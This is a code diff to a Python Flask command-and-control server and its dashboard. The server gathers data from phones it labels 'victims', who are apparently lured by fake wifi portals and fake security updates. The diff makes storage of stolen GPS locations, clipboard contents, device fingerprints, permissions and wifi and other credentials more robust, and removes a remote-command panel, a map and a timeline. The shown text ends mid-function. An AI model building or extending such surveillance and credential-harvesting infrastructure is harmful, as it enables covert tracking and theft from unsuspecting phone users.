@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Advanced Mobile Security C&C Server with Full Dashboard Features
-Complete victim management, data analysis, and real-time monitoring
+Fixed Advanced Mobile Security C&C Server 
+Resolved database storage issues and improved error handling
 """
 
 from flask import Flask, request, jsonify, render_template_string, send_file
@@ -26,28 +26,28 @@ PORT = int(os.environ.get('PORT', 5000))
 DATABASE = 'c2_data.db'
 
 def init_db():
-    """Initialize SQLite database with enhanced schema"""
+    """Initialize SQLite database with simplified but robust schema"""
     try:
         conn = sqlite3.connect(DATABASE)
         cursor = conn.cursor()
         
-        # Drop existing tables to recreate with new schema
+        # Drop existing tables to recreate with fixed schema
         cursor.execute('DROP TABLE IF EXISTS collected_data')
         cursor.execute('DROP TABLE IF EXISTS victims')
         cursor.execute('DROP TABLE IF EXISTS commands')
         cursor.execute('DROP TABLE IF EXISTS sessions')
         
-        # Enhanced victims table
+        # Simplified victims table - focusing on essential fields
         cursor.execute('''
             CREATE TABLE victims (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT UNIQUE,
+                victim_id TEXT UNIQUE NOT NULL,
                 session_id TEXT,
-                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                first_seen TEXT DEFAULT (datetime('now')),
+                last_seen TEXT DEFAULT (datetime('now')),
                 user_agent TEXT,
                 ip_address TEXT,
-                attack_type TEXT,
+                attack_type TEXT DEFAULT 'unknown',
                 status TEXT DEFAULT 'active',
                 location_lat REAL,
                 location_lng REAL,
@@ -57,17 +57,18 @@ def init_db():
             )
         ''')
         
-        # Enhanced data collection table
+        # Simplified data collection table
         cursor.execute('''
             CREATE TABLE collected_data (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT,
-                data_type TEXT,
+                victim_id TEXT NOT NULL,
+                data_type TEXT DEFAULT 'unknown',
                 data_content TEXT,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source_url TEXT,
+                timestamp TEXT DEFAULT (datetime('now')),
+                source_url TEXT DEFAULT 'unknown',
                 severity TEXT DEFAULT 'medium',
-                tags TEXT
+                tags TEXT,
+                FOREIGN KEY (victim_id) REFERENCES victims (victim_id)
             )
         ''')
         
@@ -79,8 +80,8 @@ def init_db():
                 command_type TEXT,
                 command_data TEXT,
                 status TEXT DEFAULT 'pending',
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                executed_at TIMESTAMP
+                created_at TEXT DEFAULT (datetime('now')),
+                executed_at TEXT
             )
         ''')
         
@@ -89,8 +90,8 @@ def init_db():
             CREATE TABLE sessions (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 victim_id TEXT,
-                session_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                session_end TIMESTAMP,
+                session_start TEXT DEFAULT (datetime('now')),
+                session_end TEXT,
                 duration INTEGER,
                 page_views INTEGER DEFAULT 0,
                 actions_performed INTEGER DEFAULT 0
@@ -99,74 +100,95 @@ def init_db():
         
         conn.commit()
         conn.close()
-        log_activity("✅ Enhanced database initialized successfully")
+        log_activity("✅ Fixed database initialized successfully")
         return True
         
     except Exception as e:
         log_activity(f"❌ Database initialization failed: {e}")
+        traceback.print_exc()
         return False
 
 def log_activity(message, ip_address="server"):
-    """Enhanced logging with severity levels"""
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")
+    """Enhanced logging with error handling"""
+    try:
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")
+    except Exception as e:
+        print(f"Logging error: {e}")
 
 def store_victim_data(victim_id, data_type, content, source_url, ip_address, user_agent, attack_type='unknown'):
-    """Enhanced victim data storage with metadata"""
+    """Fixed victim data storage with better error handling"""
     try:
         conn = sqlite3.connect(DATABASE)
         cursor = conn.cursor()
         
-        # Extract additional metadata from content
+        # Ensure victim_id is provided
+        if not victim_id:
+            victim_id = f'victim_{int(time.time())}'
+        
+        # Extract metadata safely
         session_id = ''
         location_lat, location_lng = None, None
-        device_info = {}
-        permissions_granted = []
+        device_info = '{}'
+        permissions_granted = '[]'
         
         if isinstance(content, dict):
             session_id = content.get('session_id', '')
             
-            # Extract location data
+            # Extract location data safely
             if 'latitude' in content and 'longitude' in content:
-                location_lat = content.get('latitude')
-                location_lng = content.get('longitude')
+                try:
+                    location_lat = float(content.get('latitude'))
+                    location_lng = float(content.get('longitude'))
+                except (ValueError, TypeError):
+                    location_lat, location_lng = None, None
             
-            # Extract device fingerprint
+            # Extract device fingerprint safely
             if data_type == 'device_fingerprint':
-                device_info = {
+                device_info = json.dumps({
                     'platform': content.get('platform', ''),
                     'screen': content.get('screenResolution', ''),
                     'timezone': content.get('timezone', ''),
                     'language': content.get('language', '')
-                }
+                })
             
-            # Track permissions
+            # Track permissions safely
             if 'permission' in content:
-                permissions_granted.append(content.get('permission'))
+                permissions_granted = json.dumps([content.get('permission')])
         
-        # Update or insert victim info with enhanced data
+        # Get current timestamp
+        current_time = datetime.now().isoformat()
+        
+        # Insert or update victim - using INSERT OR IGNORE then UPDATE
         cursor.execute('''
-            INSERT OR REPLACE INTO victims 
-            (victim_id, session_id, last_seen, user_agent, ip_address, attack_type, 
+            INSERT OR IGNORE INTO victims 
+            (victim_id, session_id, first_seen, last_seen, user_agent, ip_address, attack_type, 
              location_lat, location_lng, device_info, permissions_granted)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (victim_id, session_id, datetime.now(), user_agent, ip_address, attack_type,
-              location_lat, location_lng, json.dumps(device_info), json.dumps(permissions_granted)))
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (victim_id, session_id, current_time, current_time, user_agent, ip_address, attack_type,
+              location_lat, location_lng, device_info, permissions_granted))
+        
+        # Update last_seen and other fields if victim already exists
+        cursor.execute('''
+            UPDATE victims 
+            SET last_seen = ?, user_agent = ?, ip_address = ?, attack_type = ?
+            WHERE victim_id = ?
+        ''', (current_time, user_agent, ip_address, attack_type, victim_id))
         
         # Determine severity based on data type
         severity = 'low'
         if data_type in ['location_data', 'clipboard_data', 'device_fingerprint']:
             severity = 'high'
-        elif data_type in ['permission_granted', 'background_monitor']:
+        elif data_type in ['permission_granted', 'background_monitor', 'wifi_credentials', 'security_credentials']:
             severity = 'medium'
         
-        # Store data point with enhanced metadata
+        # Store data point
         content_str = json.dumps(content) if isinstance(content, dict) else str(content)
         cursor.execute('''
             INSERT INTO collected_data 
-            (victim_id, data_type, data_content, source_url, severity)
-            VALUES (?, ?, ?, ?, ?)
-        ''', (victim_id, data_type, content_str, source_url, severity))
+            (victim_id, data_type, data_content, timestamp, source_url, severity)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (victim_id, data_type, content_str, current_time, source_url, severity))
         
         conn.commit()
         conn.close()
@@ -177,6 +199,13 @@ def store_victim_data(victim_id, data_type, content, source_url, ip_address, use
     except Exception as e:
         log_activity(f"❌ Database error in store_victim_data: {e}", ip_address)
         traceback.print_exc()
+        
+        # Try to close connection if still open
+        try:
+            conn.close()
+        except:
+            pass
+        
         return False
 
 @app.route('/')
@@ -356,104 +385,22 @@ def dashboard():
             background: linear-gradient(45deg, #ff8e8e, #ffaaaa);
         }
         
-        .search-filter {
-            background: #333;
-            color: #00ff41;
-            border: 1px solid #00ff41;
-            padding: 8px;
-            border-radius: 5px;
-            margin: 10px 5px;
-        }
-        
-        .filter-controls {
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(0, 255, 65, 0.1);
-            border-radius: 10px;
-        }
-        
-        .map-container {
-            height: 400px;
-            background: #222;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #888;
-        }
-        
-        .data-chart {
-            height: 300px;
-            background: #222;
-            border-radius: 10px;
-            margin: 20px 0;
-        }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-        }
-        
-        .modal-content {
-            background: #1a1a2e;
-            margin: 5% auto;
-            padding: 20px;
-            border: 2px solid #00ff41;
-            border-radius: 15px;
-            width: 80%;
-            max-width: 800px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        
-        .close {
+        .error-message {
+            background: rgba(255, 107, 107, 0.2);
+            border: 1px solid #ff6b6b;
             color: #ff6b6b;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
         }
         
-        .close:hover {
-            color: #fff;
-        }
-        
-        .json-display {
-            background: #000;
+        .success-message {
+            background: rgba(0, 255, 65, 0.2);
+            border: 1px solid #00ff41;
             color: #00ff41;
             padding: 15px;
-            border-radius: 5px;
-            white-space: pre-wrap;
-            font-family: monospace;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        
-        .timeline {
-            border-left: 2px solid #00ff41;
-            padding-left: 20px;
-            margin: 20px 0;
-        }
-        
-        .timeline-item {
-            background: rgba(0, 255, 65, 0.1);
-            padding: 15px;
-            margin: 10px 0;
             border-radius: 10px;
-            border-left: 4px solid #00ff41;
-        }
-        
-        .export-section {
             margin: 20px 0;
-            padding: 15px;
-            background: rgba(0, 255, 65, 0.05);
-            border-radius: 10px;
         }
         
         @media (max-width: 768px) {
@@ -480,9 +427,6 @@ def dashboard():
         <a href="#" class="nav-item active" onclick="showSection('overview')">📊 Overview</a>
         <a href="#" class="nav-item" onclick="showSection('victims')">👥 Victims</a>
         <a href="#" class="nav-item" onclick="showSection('data')">📋 Data Analysis</a>
-        <a href="#" class="nav-item" onclick="showSection('map')">🗺️ Geolocation</a>
-        <a href="#" class="nav-item" onclick="showSection('timeline')">⏰ Timeline</a>
-        <a href="#" class="nav-item" onclick="showSection('commands')">⚡ Commands</a>
         <a href="#" class="nav-item" onclick="showSection('export')">💾 Export Data</a>
         <a href="#" class="nav-item" onclick="showSection('settings')">⚙️ Settings</a>
         
@@ -492,7 +436,7 @@ def dashboard():
         </div>
         
         <div style="margin-top: 20px; font-size: 0.8rem; color: #888;">
-            <div>📡 Server: Online</div>
+            <div>📡 Server: <span id="server-status">Online</span></div>
             <div>⏱️ Uptime: <span id="uptime">0h 0m</span></div>
             <div>🔄 Auto-refresh: <span id="auto-refresh-status">ON</span></div>
         </div>
@@ -504,9 +448,11 @@ def dashboard():
         <div id="overview-section" class="content-section active">
             <div class="header">
                 <h1>🎯 Advanced Command & Control Dashboard</h1>
-                <p>🌍 Mobile Security Testing C&C Server - Full Features</p>
-                <p style="margin-top: 10px; color: #ffaa00;">⚡ Powered by Railway - v2.0 Enhanced</p>
+                <p>🌍 Mobile Security Testing C&C Server - Fixed Version</p>
+                <p style="margin-top: 10px; color: #ffaa00;">⚡ Powered by Railway - v2.1 Database Fixed</p>
             </div>
+            
+            <div id="message-container"></div>
             
             <div class="stats">
                 <div class="stat-box">
@@ -534,37 +480,11 @@ def dashboard():
                     <div class="stat-label">Server Uptime</div>
                 </div>
             </div>
-            
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-                <div class="data-chart" id="attack-chart">
-                    <canvas id="attackTypesChart" width="400" height="300"></canvas>
-                </div>
-                <div class="data-chart" id="severity-chart">
-                    <canvas id="severityChart" width="400" height="300"></canvas>
-                </div>
-            </div>
         </div>
 
         <!-- Victims Section -->
         <div id="victims-section" class="content-section">
             <h2>👥 Victim Management</h2>
-            
-            <div class="filter-controls">
-                <input type="text" class="search-filter" id="victim-search" placeholder="🔍 Search victims..." onkeyup="filterVictims()">
-                <select class="search-filter" id="status-filter" onchange="filterVictims()">
-                    <option value="">All Status</option>
-                    <option value="online">Online</option>
-                    <option value="away">Away</option>
-                    <option value="offline">Offline</option>
-                </select>
-                <select class="search-filter" id="attack-filter" onchange="filterVictims()">
-                    <option value="">All Attack Types</option>
-                    <option value="wifi_portal">WiFi Portal</option>
-                    <option value="security_update">Security Update</option>
-                    <option value="manual_test">Manual Test</option>
-                </select>
-                <button onclick="exportVictims()">📥 Export CSV</button>
-            </div>
             
             <table class="victims-table">
                 <thead>
@@ -589,82 +509,9 @@ def dashboard():
         <!-- Data Analysis Section -->
         <div id="data-section" class="content-section">
             <h2>📋 Data Analysis</h2>
-            
-            <div class="filter-controls">
-                <input type="text" class="search-filter" id="data-search" placeholder="🔍 Search data..." onkeyup="filterData()">
-                <select class="search-filter" id="data-type-filter" onchange="filterData()">
-                    <option value="">All Data Types</option>
-                    <option value="device_fingerprint">Device Fingerprint</option>
-                    <option value="location_data">Location Data</option>
-                    <option value="clipboard_data">Clipboard Data</option>
-                    <option value="permission_granted">Permissions</option>
-                </select>
-                <select class="search-filter" id="severity-filter" onchange="filterData()">
-                    <option value="">All Severity</option>
-                    <option value="high">High</option>
-                    <option value="medium">Medium</option>
-                    <option value="low">Low</option>
-                </select>
-            </div>
-            
             <div id="data-analysis-content">
                 <div style="text-align: center; padding: 40px; color: #666;">
                     🔄 Loading data analysis...
-                </div>
-            </div>
-        </div>
-
-        <!-- Geolocation Section -->
-        <div id="map-section" class="content-section">
-            <h2>🗺️ Victim Geolocation</h2>
-            <div class="map-container">
-                <div style="text-align: center;">
-                    <div style="font-size: 3rem; margin-bottom: 20px;">🗺️</div>
-                    <div>Interactive Map - Location Data Visualization</div>
-                    <div style="margin-top: 10px; font-size: 0.9rem;">Shows victim locations from captured GPS data</div>
-                </div>
-            </div>
-            <div id="location-list" style="margin-top: 20px;">
-                <!-- Location data will be populated here -->
-            </div>
-        </div>
-
-        <!-- Timeline Section -->
-        <div id="timeline-section" class="content-section">
-            <h2>⏰ Attack Timeline</h2>
-            <div class="filter-controls">
-                <input type="date" class="search-filter" id="date-from">
-                <input type="date" class="search-filter" id="date-to">
-                <button onclick="filterTimeline()">🔍 Filter Timeline</button>
-            </div>
-            <div class="timeline" id="timeline-content">
-                <div style="text-align: center; padding: 40px; color: #666;">
-                    🔄 Loading timeline...
-                </div>
-            </div>
-        </div>
-
-        <!-- Commands Section -->
-        <div id="commands-section" class="content-section">
-            <h2>⚡ Remote Commands</h2>
-            <div class="filter-controls">
-                <select class="search-filter" id="command-victim">
-                    <option value="">Select Victim</option>
-                </select>
-                <select class="search-filter" id="command-type">
-                    <option value="get_location">📍 Get Location</option>
-                    <option value="get_battery">🔋 Get Battery Status</option>
-                    <option value="get_network">🌐 Get Network Info</option>
-                    <option value="take_screenshot">📸 Take Screenshot</option>
-                    <option value="get_clipboard">📋 Get Clipboard</option>
-                </select>
-                <button onclick="sendCommand()">📤 Send Command</button>
-            </div>
-            
-            <h3>📋 Command History</h3>
-            <div id="commands-history">
-                <div style="text-align: center; padding: 40px; color: #666;">
-                    No commands sent yet
                 </div>
             </div>
         </div>
@@ -673,69 +520,40 @@ def dashboard():
         <div id="export-section" class="content-section">
             <h2>💾 Data Export & Reports</h2>
             
-            <div class="export-section">
-                <h3>📊 Export Options</h3>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
-                    <button onclick="exportData('victims')">👥 Export Victims (CSV)</button>
-                    <button onclick="exportData('data')">📋 Export All Data (JSON)</button>
-                    <button onclick="exportData('timeline')">⏰ Export Timeline (CSV)</button>
-                    <button onclick="generateReport()">📄 Generate Report (HTML)</button>
-                </div>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
+                <button onclick="exportData('victims')">👥 Export Victims (CSV)</button>
+                <button onclick="exportData('data')">📋 Export All Data (JSON)</button>
+                <button onclick="generateReport()">📄 Generate Report (HTML)</button>
             </div>
             
-            <div class="export-section">
-                <h3>📈 Analytics Reports</h3>
-                <div id="analytics-summary">
-                    <div style="text-align: center; padding: 40px; color: #666;">
-                        🔄 Generating analytics...
-                    </div>
-                </div>
-            </div>
+            <div id="export-status"></div>
         </div>
 
         <!-- Settings Section -->
         <div id="settings-section" class="content-section">
             <h2>⚙️ System Settings</h2>
             
-            <div class="export-section">
+            <div style="background: rgba(0, 255, 65, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
                 <h3>🔧 Dashboard Settings</h3>
-                <label>
+                <label style="display: block; margin: 10px 0;">
                     <input type="checkbox" id="auto-refresh" checked onchange="toggleAutoRefresh()">
                     Enable Auto-refresh (30s)
-                </label><br><br>
+                </label>
                 
-                <label>
-                    <input type="checkbox" id="sound-alerts" onchange="toggleSoundAlerts()">
-                    Sound alerts for new victims
-                </label><br><br>
-                
-                <label>
+                <label style="display: block; margin: 10px 0;">
                     Refresh Interval: 
                     <select id="refresh-interval" onchange="updateRefreshInterval()">
                         <option value="10">10 seconds</option>
                         <option value="30" selected>30 seconds</option>
                         <option value="60">1 minute</option>
-                        <option value="300">5 minutes</option>
                     </select>
                 </label>
             </div>
             
-            <div class="export-section">
+            <div style="background: rgba(255, 107, 107, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
                 <h3>🗃️ Database Management</h3>
-                <button onclick="backupDatabase()">💾 Backup Database</button>
-                <button onclick="clearOldData()" class="btn-danger">🗑️ Clear Old Data (30+ days)</button>
-                <button onclick="resetDatabase()" class="btn-danger">⚠️ Reset All Data</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Victim Detail Modal -->
-    <div id="victimModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal()">&times;</span>
-            <h2 id="modal-title">🎯 Victim Details</h2>
-            <div id="modal-content">
-                <!-- Victim details will be loaded here -->
+                <button onclick="testDatabase()" style="margin: 5px;">🧪 Test Database</button>
+                <button onclick="clearAllData()" class="btn-danger" style="margin: 5px;">🗑️ Clear All Data</button>
             </div>
         </div>
     </div>
@@ -744,7 +562,7 @@ def dashboard():
         let currentData = {
             victims: [],
             dataPoints: [],
-            commands: []
+            stats: {}
         };
         
         let autoRefreshEnabled = true;
@@ -753,65 +571,58 @@ def dashboard():
         
         // Navigation
         function showSection(sectionName) {
-            // Hide all sections
             document.querySelectorAll('.content-section').forEach(section => {
                 section.classList.remove('active');
             });
             
-            // Remove active from nav items
             document.querySelectorAll('.nav-item').forEach(item => {
                 item.classList.remove('active');
             });
             
-            // Show selected section
             document.getElementById(sectionName + '-section').classList.add('active');
-            
-            // Add active to clicked nav item
             event.target.classList.add('active');
             
-            // Load section-specific data
             loadSectionData(sectionName);
         }
         
         function loadSectionData(section) {
             switch(section) {
                 case 'overview':
-                    loadOverviewData();
-                    break;
                 case 'victims':
-                    loadVictimsData();
-                    break;
                 case 'data':
-                    loadDataAnalysis();
-                    break;
-                case 'map':
-                    loadMapData();
-                    break;
-                case 'timeline':
-                    loadTimelineData();
-                    break;
-                case 'commands':
-                    loadCommandsData();
-                    break;
-                case 'export':
-                    generateAnalytics();
+                    refreshAllData();
                     break;
             }
         }
         
-        // Data loading functions
+        function showMessage(message, type = 'info') {
+            const container = document.getElementById('message-container');
+            const className = type === 'error' ? 'error-message' : 'success-message';
+            container.innerHTML = `<div class="${className}">${message}</div>`;
+            
+            setTimeout(() => {
+                container.innerHTML = '';
+            }, 5000);
+        }
+        
         async function refreshAllData() {
             try {
+                document.getElementById('server-status').textContent = 'Connecting...';
+                
                 const response = await fetch('/api/dashboard-data');
                 if (response.ok) {
                     currentData = await response.json();
                     updateAllDisplays();
-                    console.log('📊 Dashboard data refreshed');
+                    document.getElementById('server-status').textContent = 'Online';
+                    document.getElementById('server-status').style.color = '#00ff41';
                 } else {
-                    console.error('Failed to refresh data');
+                    throw new Error(`HTTP ${response.status}`);
                 }
             } catch (error) {
                 console.error('Error refreshing data:', error);
+                document.getElementById('server-status').textContent = 'Error';
+                document.getElementById('server-status').style.color = '#ff6b6b';
+                showMessage(`Connection error: ${error.message}`, 'error');
             }
         }
         
@@ -819,7 +630,6 @@ def dashboard():
             updateStats();
             updateVictimsTable();
             updateDataAnalysis();
-            updateTimeline();
         }
         
         function updateStats() {
@@ -829,16 +639,6 @@ def dashboard():
             document.getElementById('total-data').textContent = stats.total_data || 0;
             document.getElementById('high-severity').textContent = stats.high_severity || 0;
             document.getElementById('attack-types').textContent = stats.attack_types || 0;
-        }
-        
-        function loadOverviewData() {
-            // Update charts and overview statistics
-            updateStats();
-            // TODO: Implement chart.js for attack types and severity charts
-        }
-        
-        function loadVictimsData() {
-            updateVictimsTable();
         }
         
         function updateVictimsTable() {
@@ -877,15 +677,13 @@ def dashboard():
                     <td>${location}</td>
                     <td>
                         <button onclick="viewVictim('${victim.victim_id}')" title="View Details">👁️ View</button>
-                        <button onclick="sendCommandTo('${victim.victim_id}')" title="Send Command">⚡ Cmd</button>
-                        <button onclick="trackVictim('${victim.victim_id}')" title="Track Location">📍 Track</button>
                         <button onclick="deleteVictim('${victim.victim_id}')" class="btn-danger" title="Delete">🗑️</button>
                     </td>
                 `;
             });
         }
         
-        function loadDataAnalysis() {
+        function updateDataAnalysis() {
             const container = document.getElementById('data-analysis-content');
             
             if (!currentData.dataPoints || currentData.dataPoints.length === 0) {
@@ -895,9 +693,9 @@ def dashboard():
             
             let html = '<table class="victims-table"><thead><tr>';
             html += '<th>⏰ Timestamp</th><th>🆔 Victim ID</th><th>📋 Data Type</th>';
-            html += '<th>⚠️ Severity</th><th>📍 Source</th><th>🛠️ Actions</th></tr></thead><tbody>';
+            html += '<th>⚠️ Severity</th><th>📍 Source</th></tr></thead><tbody>';
             
-            currentData.dataPoints.forEach(data => {
+            currentData.dataPoints.slice(0, 50).forEach(data => {
                 const shortVictimId = data.victim_id.substring(0, 15) + '...';
                 const timestamp = new Date(data.timestamp).toLocaleString();
                 
@@ -907,10 +705,6 @@ def dashboard():
                     <td>${data.data_type}</td>
                     <td class="severity-${data.severity}">${data.severity.toUpperCase()}</td>
                     <td>${data.source_url}</td>
-                    <td>
-                        <button onclick="viewDataDetail(${data.id})" title="View Content">👁️ View</button>
-                        <button onclick="exportDataPoint(${data.id})" title="Export">💾 Export</button>
-                    </td>
                 </tr>`;
             });
             
@@ -918,113 +712,6 @@ def dashboard():
             container.innerHTML = html;
         }
         
-        function loadMapData() {
-            const container = document.getElementById('location-list');
-            const victims = currentData.victims.filter(v => v.location_lat && v.location_lng);
-            
-            if (victims.length === 0) {
-                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">📍 No location data available</div>';
-                return;
-            }
-            
-            let html = '<h3>📍 Victim Locations</h3>';
-            victims.forEach(victim => {
-                html += `<div class="timeline-item">
-                    <strong>🎯 ${victim.victim_id.substring(0, 20)}...</strong><br>
-                    📍 Coordinates: ${victim.location_lat.toFixed(6)}, ${victim.location_lng.toFixed(6)}<br>
-                    🕒 Last Seen: ${new Date(victim.last_seen).toLocaleString()}<br>
-                    <button onclick="openMaps(${victim.location_lat}, ${victim.location_lng})">🗺️ Open in Maps</button>
-                </div>`;
-            });
-            
-            container.innerHTML = html;
-        }
-        
-        function loadTimelineData() {
-            const container = document.getElementById('timeline-content');
-            
-            if (!currentData.dataPoints || currentData.dataPoints.length === 0) {
-                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">⏰ No timeline data available</div>';
-                return;
-            }
-            
-            // Sort by timestamp
-            const sortedData = [...currentData.dataPoints].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-            
-            let html = '';
-            sortedData.forEach(data => {
-                const timestamp = new Date(data.timestamp).toLocaleString();
-                const icon = getDataTypeIcon(data.data_type);
-                
-                html += `<div class="timeline-item">
-                    <div style="display: flex; justify-content: space-between;">
-                        <span><strong>${icon} ${data.data_type}</strong></span>
-                        <span class="severity-${data.severity}">${data.severity.toUpperCase()}</span>
-                    </div>
-                    <div>🆔 Victim: ${data.victim_id.substring(0, 20)}...</div>
-                    <div>🕒 ${timestamp}</div>
-                    <div>📍 Source: ${data.source_url}</div>
-                </div>`;
-            });
-            
-            container.innerHTML = html;
-        }
-        
-        function loadCommandsData() {
-            // Populate victim dropdown
-            const select = document.getElementById('command-victim');
-            select.innerHTML = '<option value="">Select Victim</option>';
-            
-            currentData.victims.forEach(victim => {
-                const option = document.createElement('option');
-                option.value = victim.victim_id;
-                option.textContent = `${victim.victim_id.substring(0, 20)}... (${victim.attack_type})`;
-                select.appendChild(option);
-            });
-        }
-        
-        function generateAnalytics() {
-            const container = document.getElementById('analytics-summary');
-            
-            if (!currentData.victims || currentData.victims.length === 0) {
-                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">📊 No data for analytics</div>';
-                return;
-            }
-            
-            // Generate analytics summary
-            const stats = {
-                totalVictims: currentData.victims.length,
-                attackTypes: [...new Set(currentData.victims.map(v => v.attack_type))].length,
-                avgSessionTime: calculateAverageSessionTime(),
-                topCountries: getTopCountries(),
-                mostCommonOS: getMostCommonOS()
-            };
-            
-            let html = `
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-                    <div class="stat-box">
-                        <div class="stat-number">${stats.totalVictims}</div>
-                        <div class="stat-label">Total Victims</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number">${stats.attackTypes}</div>
-                        <div class="stat-label">Attack Types</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number">${stats.avgSessionTime}m</div>
-                        <div class="stat-label">Avg Session</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-number">${stats.topCountries}</div>
-                        <div class="stat-label">Top Country</div>
-                    </div>
-                </div>
-            `;
-            
-            container.innerHTML = html;
-        }
-        
-        // Utility functions
         function getDeviceType(userAgent) {
             if (userAgent.includes('iPhone')) return '📱 iPhone';
             if (userAgent.includes('iPad')) return '📱 iPad';
@@ -1041,153 +728,47 @@ def dashboard():
             return `${Math.floor(seconds/86400)}d`;
         }
         
-        function getDataTypeIcon(dataType) {
-            const icons = {
-                'device_fingerprint': '📱',
-                'location_data': '📍',
-                'clipboard_data': '📋',
-                'permission_granted': '🔐',
-                'background_monitor': '📡',
-                'wifi_credentials': '📶',
-                'security_credentials': '🔒'
-            };
-            return icons[dataType] || '📄';
-        }
-        
-        // Action functions
         function viewVictim(victimId) {
-            fetch(`/api/victim/${victimId}/details`)
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('modal-title').textContent = `🎯 Victim: ${victimId.substring(0, 20)}...`;
-                    
-                    let html = `
-                        <div class="export-section">
-                            <h3>📋 Basic Information</h3>
-                            <div><strong>ID:</strong> ${data.victim.victim_id}</div>
-                            <div><strong>Attack Type:</strong> ${data.victim.attack_type}</div>
-                            <div><strong>IP Address:</strong> ${data.victim.ip_address}</div>
-                            <div><strong>User Agent:</strong> ${data.victim.user_agent}</div>
-                            <div><strong>First Seen:</strong> ${new Date(data.victim.first_seen).toLocaleString()}</div>
-                            <div><strong>Last Seen:</strong> ${new Date(data.victim.last_seen).toLocaleString()}</div>
-                        </div>
-                        
-                        <div class="export-section">
-                            <h3>📊 Collected Data (${data.dataPoints.length} items)</h3>
-                            <div class="json-display">${JSON.stringify(data.dataPoints, null, 2)}</div>
-                        </div>
-                    `;
-                    
-                    document.getElementById('modal-content').innerHTML = html;
-                    document.getElementById('victimModal').style.display = 'block';
-                })
-                .catch(error => {
-                    console.error('Error loading victim details:', error);
-                });
-        }
-        
-        function sendCommand() {
-            const victimId = document.getElementById('command-victim').value;
-            const commandType = document.getElementById('command-type').value;
-            
-            if (!victimId || !commandType) {
-                alert('Please select victim and command type');
-                return;
-            }
-            
-            fetch('/api/send-command', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    victim_id: victimId,
-                    command_type: commandType
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert(`Command sent successfully! ID: ${data.command_id}`);
-                loadCommandsData(); // Refresh command history
-            })
-            .catch(error => {
-                console.error('Error sending command:', error);
-                alert('Failed to send command');
-            });
+            window.open(`/victim/${victimId}`, '_blank');
         }
         
         function exportData(type) {
             const url = `/api/export/${type}`;
             window.open(url, '_blank');
+            showMessage(`Exporting ${type} data...`, 'info');
         }
         
-        function clearAllData() {
+        async function clearAllData() {
             if (confirm('⚠️ This will delete ALL victim data. Are you sure?')) {
-                fetch('/api/clear-data', { method: 'POST' })
-                    .then(response => response.json())
-                    .then(data => {
-                        alert('All data cleared successfully');
+                try {
+                    const response = await fetch('/api/clear-data', { method: 'POST' });
+                    const result = await response.json();
+                    
+                    if (response.ok) {
+                        showMessage('All data cleared successfully', 'info');
                         refreshAllData();
-                    })
-                    .catch(error => {
-                        console.error('Error clearing data:', error);
-                        alert('Failed to clear data');
-                    });
+                    } else {
+                        throw new Error(result.error || 'Unknown error');
+                    }
+                } catch (error) {
+                    showMessage(`Failed to clear data: ${error.message}`, 'error');
+                }
             }
         }
         
-        function openMaps(lat, lng) {
-            const url = `https://www.google.com/maps?q=${lat},${lng}`;
-            window.open(url, '_blank');
-        }
-        
-        function closeModal() {
-            document.getElementById('victimModal').style.display = 'none';
-        }
-        
-        // Helper functions
-        function calculateAverageSessionTime() {
-            // Calculate based on first seen vs last seen
-            if (!currentData.victims.length) return 0;
-            
-            const totalTime = currentData.victims.reduce((acc, victim) => {
-                const duration = new Date(victim.last_seen) - new Date(victim.first_seen);
-                return acc + (duration / 1000 / 60); // Convert to minutes
-            }, 0);
-            
-            return Math.round(totalTime / currentData.victims.length);
-        }
-        
-        function getTopCountries() {
-            // Simplified - would need IP geolocation in real implementation
-            return 'US';
-        }
-        
-        function getMostCommonOS() {
-            if (!currentData.victims.length) return 'Unknown';
-            
-            const osCounts = {};
